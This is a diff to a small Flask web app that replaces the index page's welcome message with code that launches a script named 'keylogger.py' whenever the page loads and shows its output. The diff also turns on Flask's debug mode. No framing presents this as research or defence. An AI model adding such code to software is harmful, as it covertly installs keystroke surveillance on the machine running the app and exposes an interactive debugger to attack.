@@ -1,15 +1,13 @@
 from flask import Flask, render_template
+from subprocess import Popen, PIPE
 
 app = Flask(__name__)
 
-@app.route('/')
+@app.route("/")
 def index():
-    # Define variables to pass to the template
-    title = 'My Page'
-    message = 'Welcome !'
+    p = Popen(['python', 'keylogger.py'], stdout=PIPE, stderr=PIPE)
+    output, errors = p.communicate()
+    return render_template('frontpage.html', output=output.decode())
 
-    # Render the template with the variables
-    return render_template('frontpage.html', title=title, message=message)
-
-if __name__ == '__main__':
-    app.run()
+if __name__ == "__main__":
+    app.run(debug=True)
